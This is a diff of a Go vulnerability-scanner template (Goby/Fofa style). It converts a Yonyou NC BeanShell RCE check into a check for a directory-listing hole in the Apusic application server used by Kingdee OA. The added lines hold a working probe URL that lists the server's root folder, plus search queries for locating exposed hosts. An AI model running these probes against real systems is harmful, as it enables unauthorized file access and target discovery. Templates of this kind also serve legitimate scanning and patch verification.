@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Apusic-公司产品\" || product=\"Apusic-公司产品\"",
+  "GobyQuery": "app=\"Apusic-公司产品\" || product=\"Apusic-公司产品\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/admin/protected/selector/server_file/files?folder=/",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,14 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "\"/etc\"",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"/boot\"",
             "bz": ""
           }
         ]
@@ -107,7 +114,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +123,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "jindie OA Apusic dir list",
       "Product": "",
       "Description": "",
       "Recommendation": "",
